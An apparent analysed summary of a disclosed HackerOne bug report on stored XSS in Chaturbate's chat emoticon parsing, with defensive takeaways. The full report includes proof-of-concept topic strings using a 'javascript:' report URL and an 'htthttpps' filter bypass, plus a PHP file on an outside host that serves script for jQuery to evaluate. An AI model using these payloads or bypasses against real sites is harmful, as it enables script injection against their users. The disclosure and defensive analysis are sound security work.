# Stored XSS in Chat Topic via Insecure Emoticon Parsing and Report URL Handling

## Metadata
- **Source:** HackerOne
- **Report:** 429298 | https://hackerone.com/reports/429298
- **Submitted:** 2018-10-26
- **Reporter:** avlidienbrunn
- **Program:** Chaturbate
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Stored Cross-Site Scripting (XSS), Input Validation Bypass, Unsafe jQuery AJAX Usage, URL Scheme Validation Bypass
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability exists in Chaturbate's emoticon parsing functionality due to insufficient validation of the REPORT_URL parameter in emoticon definitions. Combined with a string replacement filter bypass (htthttpps → https) and unsafe jQuery AJAX handling, attackers can execute arbitrary JavaScript in users' browsers through chat topics.

## Attack scenario
1. Attacker crafts a malicious emoticon definition with javascript: protocol in REPORT_URL parameter
2. Attacker sets room topic to include the emoticon string, bypassing the http filter using 'htthttpps' variant
3. Victim views the chat room and sees the emoticon embedded in the topic
4. Victim clicks the emoticon, triggering the 'report emoticon' prompt
5. Victim ctrl-clicks or right-clicks the 'REPORT EMOTICON' link, executing the javascript: payload
6. Alternatively, victim clicks report and attacker-controlled server returns JavaScript in response, which jQuery evaluates as code

## Root cause
Multiple security failures: (1) REPORT_URL parameter has no URL scheme validation or whitelist, (2) Chat topic link filter uses naive string replacement vulnerable to htthttpps bypass, (3) jQuery AJAX implicitly evaluates javascript content-type responses without explicit dataType configuration, (4) No Content Security Policy preventing javascript: protocol execution in certain contexts

## Attacker mindset
An attacker would identify that emoticon metadata is user-controllable via chat topics and systematically test each parameter for injection opportunities. Recognizing the string filter uses simple replacement, they'd attempt common bypass patterns. Understanding jQuery's implicit script evaluation, they'd leverage CORS headers to exfiltrate data or perform actions on behalf of victims. The two-click requirement is acceptable for a stored payload affecting all room visitors.

## Defensive takeaways
- Implement strict URL validation using a whitelist of allowed protocols (http, https only) and validate against the regex before accepting URLs
- Replace naive string filtering with proper URL parsing and reconstruction
- Use explicit dataType specifications in jQuery AJAX calls (e.g., dataType: 'json') to prevent automatic script evaluation
- Implement Content Security Policy with script-src and connect-src restrictions
- Apply HTML entity encoding to user-supplied values before insertion into DOM contexts
- Audit all user-controllable parameters in special formatting strings for injection vectors
- Consider restricting emoticon definitions to system-controlled databases rather than user-supplied metadata
- Implement rate limiting and monitoring on emoticon report functionality

## Variant hunting
Search for other message types (private messages, room descriptions, user profiles) that may parse emoticon strings. Test other metadata fields (NAME, WIDTH, HEIGHT) for XSS injection. Look for similar filter bypasses in other features using string replacement (http → htthttpps pattern). Identify other jQuery AJAX calls that implicitly evaluate responses. Check for subdomain takeover possibilities in highwebmedia.com or hotjar.com subdomains to bypass CSP connect-src restrictions.

## MITRE ATT&CK
- T1190
- T1598
- T1566

## Notes
Report demonstrates excellent research methodology by identifying multiple attack vectors (javascript: protocol vs AJAX evaluation) and understanding CSP bypass through subdomain takeover. The htthttpps filter bypass is a classic example of inadequate sanitization. jQuery's automatic script evaluation is a known historical vulnerability pattern (deprecated in newer versions). The two separate XSS paths show defense-in-depth importance: fixing REPORT_URL validation alone wouldn't prevent the javascript: attack without additional protections.

## Full report
<details><summary>Expand</summary>

## Description

The funcitonality for adding emoticons into the chat from the serverside perspective is based on a string in the following format:

```
%%%[emoticon NAME|EMOTICON_URL|WIDTH|HEIGHT|REPORT_URL]%%%
```

The `EMOTICON_URL` must conform to the following regex:
```javascript
/(http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/g
```

However, the `REPORT_URL` does not have any checks that verifies the URL. This, combined with other issues listed below, leads to stored XSS.

### Chat topic link filter bypass

The chat topic functionality has a filter that removes links from the topic, by removing the string `http`. This can be bypassed by using a string such as `htthttpps` (after replace becomes `https`).

### XSS Via ctrl/mouse3 click and  `javascript:` `REPORT_URL`
By using a `javascript:` URL as `REPORT_URL`, we can create an emoji that, when clicked, will show the "report emoticon" prompt. By ctrl-clicking or mouse3-clicking the `REPORT EMOTICON` link, the XSS triggers.

#### PoC

1. Set topic to `LUL %%%[emoticon blush|htthttpps://public.chaturbate/uploads/avatar/2011/11/08/cxecSeKtWjRK.jpg|22|22|javascript:alert(1)]%%% WUT`
2. Click emoticon
3. Ctrl/mouse3 click `REPORT EMOTICON`

{F366518}

### XSS Via emoticon report due to insecure usage of jQuery $.ajax()

The functionality for reporting an emoticon sends an AJAX request to `REPORT_URL`. This leads to XSS due to the fact that jQuery will treat any `application/javascript` response as javascript and will evaluate the response.

#### PoC

1. Set topic to `LUL %%%[emoticon blush|htthttpps://public.chaturbate/uploads/avatar/2011/11/08/cxecSeKtWjRK.jpg|22|22|htthttpps://avlidienbrunn.se/xss.php]%%% WUT`
2. Click emoticon
3. Click `REPORT EMOTICON`
4. Click `REPORT`

{F366520}

Contents of `xss.php`:
```php
<?php
header('Content-Type: text/javascript');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: X-Requested-With, connectUrl, X-CSRFToken');
?>
alert(document.domain);
```

### Notes

**CSP**
The reason the second XSS issue does not work in CSP enabled browsers is that no domain in my control is allowed by the `connect-src` directive. However, several `*.DOMAIN.COM` are included in `connect-src`:
```javascript
https://*.highwebmedia.com
https://*.chaturbate.com
https://*.hotjar.com:*
```
This means this issue can be exploited if a [subdomain takeover](https://www.hacker101.com/vulnerabilities/subdomain_takeover.html) bug exists in any of those domains. Obviously I can't test for that, but it's an important note regarding impact.

**Other exploitation areas**
The only place where I could find that didn't respond with a server error when using `%%%[emoticon ]%%%` was the room topic. However, if there is any other type of message that allows this string, that would be vulnerable as well, since the emoticon parsing functionality is ran on all messages.

## Impact

Stored XSS on chaturbate.com with 2 click interaction.

Exploitation by using an offensive image in `EMOTICON_URL` using XSS payload in `REPORT_URL`. It's also possible to create an emoticon that covers the whole chat window by using a large value in `WIDTH` and `HEIGHT`:

{F366528}

</details>

---
*Analysed by Claude on 2026-05-12*
